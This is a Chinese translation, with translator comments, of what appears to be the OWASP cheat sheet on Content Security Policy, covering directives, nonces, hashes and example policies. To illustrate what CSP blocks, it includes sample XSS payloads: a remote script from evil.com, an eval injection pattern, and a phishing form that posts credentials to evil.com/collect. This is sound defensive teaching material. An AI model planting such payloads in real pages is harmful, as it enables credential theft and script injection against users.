# 内容安全策略

## 介绍

本文提出了一种将**深度防御**概念集成到web应用程序客户端的方法。通过从服务器返回内容安全策略（CSP）头，浏览器可以感知并能够保护用户免受当前所访问的页面、加载内容的动态调用带来的风险。([D] 可以理解为动态执行JS，DOM变更时的限制策略)

## 背景

XSS（跨站点脚本）、点击劫持和跨站泄漏等漏洞日益增长进而需要**纵深防御**的安全方法。

### 防御XSS

CSP通过以下方式防御XSS攻击：

#### 1. 限制内联脚本

通过阻止页面执行内联脚本，可以防止注入

```html
<script>document.body.innerHTML='defaced'</script>
```

上述代码不会执行

#### 2. 限制远程脚本

通过防止页面从任意服务器加载脚本

```html
<script src="https://evil.com/hacked.js"></script>
```

上述代码不会执行

#### 3. 限制不安全的JavaScript

通过防止页面执行文本中JavaScript的功能，如`eval`，网站将不会受到以下漏洞的影响：

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. 限制表格提交

通过限制网站上HTML表单提交数据的位置，注入网络钓鱼表单也不会起作用。 

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5.  限制对象 

通过限制HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)标签，攻击者也不可能在页面上注入恶意flash/Java/其他遗留可执行文件。

### 防御frame攻击

点击劫持等攻击和浏览器信道攻击（xs泄漏）的某些变体需要目标网站在frame中加载恶意网站。

历史上，`X-Frame-Options`头一直用于此目的，但它已被CSP的`Frame-Options`指令淘汰。

## 纵深防御

强大的CSP针对各种类型漏洞提供了有效的第二层保护，尤其是XSS。虽然CSP不能阻止web应用程序*包含*漏洞，但它会使攻击者更难利用这些漏洞。 

即使在不接受任何用户输入的完全静态网站上，也可以使用CSP强制使用[子资源完整性（SRI）](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)。如果托管JavaScript文件（如网站访问分析脚本）的某个第三方网站受到破坏，这有助于防止在网站上加载恶意代码。 ([D] 早在15年学习HTML时，非常流行jquery，当时就思考过，托管jquery的服务器被拿下，岂不是全世界大量网站都受到影响，可以看到CSP给出了解决方法)

## CSP不能替代安全开发

CSP**不应**被视为针对XSS的唯一防御机制。您仍然必须遵循良好的开发实践，例如[防范XSS](./Cross_Site_Scripting_Prevention_Cheat_Sheet.md)中描述的实践，然后再部署CSP作为额外的安全层。

## 策略传递

您可以通过三种方式向网站传递内容安全策略。 

### 1. Content-Security-Policy 头

从web服务器返回内容安全策略HTTP响应头。

```text
Content-Security-Policy: ...
```

使用头是首选方式，支持完整的CSP功能集。将其发送到所有HTTP响应中，而不仅仅只在index页返回。

### 2. Content-Security-Policy-Report-Only 头

通过使用 `Content-Security-Policy-Report-Only`，您可以交付一个非强制执行的CSP。

```text
Content-Security-Policy-Report-Only: ...
```

尽管如此，如果使用了`report to`和`report uri`指令，违反策略的事件仍会打印到控制台并传递和上报到指定的端点。


浏览器完全支持网站同时使用 `Content-Security-Policy` 和`Content-Security-Policy-Report-Only` 的能力，没有任何问题。例如，可以使用这种模式来运行严格的 `Report-Only` 策略（会发现存在许多违反策略的上报事件），同时使用更宽松的强制策略（以避免破坏站点合法的功能）。

### 3. Content-Security-Policy 元标签

有时，如果您正在（例如）将HTML文件部署到一个CDN中，而头文件不受您的控制，则无法使用内容安全策略头。


在这种情况下，您仍然可以通过在HTML标记中指定`http equiv`元标签来使用CSP，如下所示：

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

几乎所有东西都仍受到支持，包括完整的XSS防御。但是，您将无法使用[frame防御](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors),，[沙箱](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)，[日志记录违反CSP策略的端点](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)

### HTTP头

以下头用于CSP.

- `Content-Security-Policy` : W3C规范标准头. 由Firefox 23+、Chrome 25+和Opera 19支持+
- `Content-Security-Policy-Report-Only` : W3C规范标准头.由Firefox 23+、Chrome 25+和Opera 19+支持，策略为非阻塞（“故障开放”），并将报告发送到`report-uri`（或更新的`report-to`）指令指定的URL。这通常被用作在阻塞模式下利用CSP（“故障关闭”）的前兆
- 请勿 使用`X-Content-Security-Policy`或`X-WebKit-CSP`。它们的实现已经过时（自Firefox 23、Chrome 25以来）、有约束、不一致，而且存在令人难以置信的缺陷。

## CSP指令

存在多种类型的指令，允许开发人员精确地控制策略流。

### Fetch 指令

Fetch指令告诉浏览器要信任的位置，并从中加载资源。

大多数fetch指令都有特定的[w3中所指定的fallback列表](https://www.w3.org/TR/CSP3/#directive)。该列表允许对脚本、图像、文件等数据源进行粒度级控制。

- `child-src` 允许开发人员控制嵌套在浏览的上下文和辅助执行的上下文。
- `connect-src` 提供对获取请求、XHR、eventsource、beacon和websockets连接的控制。
- `font-src` 指定加载字体的URL。
- `img-src` 指定可从中加载图像的URL。
- `manifest-src` 指定可以从中加载应用程序清单的URL。
- `media-src` 指定可以从中加载视频、音频和文本轨迹资源的URL。
- `prefetch-src` 指定可以从中预取资源的URL。
- `object-src` 指定可以从中加载插件的URL。
- `script-src` 指定可以从中执行脚本的位置。它是其他类脚本指令的fallback指令。
    - `script-src-elem` 控制执行脚本请求和块的位置。
    - `script-src-attr` 控制事件处理程序的执行。
- `style-src` 控件将样式应用于文档的位置。这包括`<link>`元素、`@import`规则和来自`link`的HTTP响应头字段的请求。
    - `style-src-elem` 控制除内联属性外的样式。
    - `style-src-attr` 控制样式属性。
- `default-src` 是其他fetch指令的fallback指令。指定的指令没有继承，但未指定的指令将返回`default src`的值。

### Document 指令

Document 指令向浏览器指示将策略应用到文档的属性。

- `base-uri` 指定 `<base>`元素可使用的URL。
- `plugin-types` 限制可加载到文档中的资源类型（*例如*application/pdf）。3条规则适用于受影响的元素以及`<embed>`和`<object>`：
    - 元素需要显式声明其类型。
    - 元素的类型需要与声明的类型匹配。
    - 元素的资源需要与声明的类型匹配。 
- `sandbox`限制页面的操作，例如提交表单。
    - 仅在与请求头`Content-Security-Policy`一起使用时适用。Only applies when used with the request header `Content-Security-Policy`.
    - 不为指令指定值将激活所有沙盒限制, 即`Content-Security-Policy: sandbox`
    - [Sandbox语法](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Navigation 指令

Navigation 指令指示浏览器文档可以导航到的位置。

- `navigate-to` 限制document导航到指定URL， 现代浏览器此功能[尚不支持](https://caniuse.com/?search=navigate-to)任意方式.
- `form-action` 限制表单可以提交到的URL.
- `frame-ancestors` 限制可以将请求的资源嵌入`<frame>`、`<iframe>`、`<object>`、`<embed>`、或`<applet>`元素中的URL。 
    - 如果此指令在`<meta>`标记中指定，则忽略该指令。
    - 此指令不会fallback到`default-src`指令。
    - `X-Frame-Options`可被该指令废弃，并被user-agents忽略。

### Reporting 指令

Reporting指令将被阻止的行为的违规行为传递到指定位置。这些指令本身没有任何用途，依赖于其他指令。

- `report-to` 定义在头部字段的组名，使用json格式赋值
    - [MDN report-to 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` 指令被`report-to` 弃用，后者是报告所发送到的URI。
    - 格式为: `Content-Security-Policy: report-uri https://example.com/csp-reports`

为了确保向后兼容性，请结合使用这两个指令。只要浏览器支持 `report-to`，它就会忽略 `report-uri`。否则，将使用 `report-uri`。



### 特别指令来源

| 指               | 描述                                         |
| ---------------- | -------------------------------------------- |
| 'none'           | 没有URL匹配。                                |
| 'self'           | 指定和origin站点相同的协议和端口号           |
| 'unsafe-inline'  | 允许使用内联脚本或样式。                     |
| 'unsafe-eval'    | 允许在脚本中使用eval。                       |
| 'strict-dynamic' | 通知浏览器信任来自根受信任脚本所加载的脚本。 |

*注意:* `strict-dynamic`不是独立的指令，应与其他指令值结合使用，例如`nonce`、`hash`等。

为了更好地理解指令源是如何工作的，请查看[w3c的源列表](https://w3c.github.io/webappsec-csp/#framework-directive-source-list)。



### Hashes

当需要内联脚本时，`script-src 'hash_algo-hash'`是只允许执行特定脚本的一个选项。

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

要获得哈希值，请查看谷歌Chrome开发者工具中是否存在以下告警行为：

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), or a nonce...

你同样可使用 [hash generator](https://report-uri.com/home/hash). 这儿有一个很棒的使用hashes的[案例](https://csp.withgoogle.com/docs/faq.html#static-content).

#### 注意

使用hashes通常不是一个很好的方法。如果通过格式化代码等方式更改脚本标记（甚至空格）内的*任何内容*，hashes将不同，脚本将不会呈现。 

### Nonces

nonce是唯一的，一次性使用的，为每个HTTP响应生成的随机值，并添加到内容安全策略头中，如下所示：

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

然后将此nonce传递给视图（使用nonce需要非静态HTML），并呈现如下所示的脚本标记：

```js
<script nonce="<%= nonce %>">
    ...
</script>
```

#### 警告

**不要**创建"script nonce=…"替换所有脚本标记的中间件,因为攻击者注入的脚本也将获得nonce。您需要一个实际的HTML模板引擎来使用nonce。([D] 可以理解为后端渲染时，拿到生成的nonce，然后置到CSP，这样就能前后匹配--- 不确定正确）

### strict-dynamic

 `strict-dynamic` 指令可以与Hashes或nonce组合使用。


如果script 正在创建其他DOM元素并在其中执行JS， `strict-dynamic` ”会告诉浏览器信任这些元素。


请注意， `strict-dynamic` 是CSP 3级功能，目前尚未得到广泛支持。有关更多详细信息，请查看 [strict-dynamic 使用](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).。

## CSP策略示例

### 基本CSP策略

该策略防止跨站framing和跨站点表单提交。它只允许来自origin域的资源使用所有默认级别的指令，不允许执行内联脚本/样式。


如果您的应用程序在这些限制下运行，它将大大减少您的攻击面，并适用于大多数现代浏览器。

最基本的策略假设：

- 所有资源都由document的同域托管
- script和样式资源没有内联或eval.
- 不需要其他网站资源来构建网站.
- 没有向外部网站提交表单.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

要进一步拧紧，可以采用以下方法：

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

该策略允许来自同一来源的图像、脚本、AJAX和CSS，并且不允许加载任何其他资源（例如，object、frame、媒体等）。

### 升级不安全的请求到安全请求

如果开发人员正在从HTTP迁移到HTTPS，则以下指令将确保所有请求都将通过HTTPS发送，而不会fallback到HTTP：

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### 阻止framing攻击(点击劫持, 跨站泄露)

- 要防止内容的所有frame，请使用：
    - `Content-Security-Policy: frame-ancestors 'none';`
- 仅允许站点自身, 使用:
    - `Content-Security-Policy: frame-ancestors 'self';`
- 要允许使用受信任域，请执行以下操作：
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### 严格策略

严格策略的作用是防止经典的存储、反射和一些DOM XSS攻击，这应该是任何试图实现CSP的团队的最佳目标。

谷歌继续建立了一个[指南](https://web.dev/strict-csp)采用基于nonce的严格CSP。

基于在Locomosec[演示文稿](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55)，以下两种策略可用于实现严格策略：

- 温和严格的政策：

```text
script-src 'nonce-r4nd0m' 'strict-dynamic';
object-src 'none'; base-uri 'none';
```

- 严格锁定政策：

```text
script-src 'nonce-r4nd0m';
object-src 'none'; base-uri 'none';
```

### 重构内联代码

当 `default-src` 或r `script-src*` 指令被激活时，CSP默认禁用HTML源代码中内联的任何JavaScript代码，例如：

```javascript
<script>
var foo = "314"
<script>
```

内联代码可以移动到单独的JavaScript文件中，页面中的代码变成：

```javascript
<script src="app.js">
</script>
```

使用 `app.js` 包含` var foo = "314"` 代码。 

内联代码限制也适用于`内联事件处理程序`，因此以下构造将在CSP下被阻止： 

```html
<button id="button1" onclick="doSomething()">
```

这应替换为`addEventListener`调用：

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

([D] 定义于DOM中的无论时js代码，或者各种事件都会无效，可以通过提取到单独的JS文件中，利用各种事件监听来实现对应的功能 )

## 引用

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [CSP Scanner](https://cspscanner.com/)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)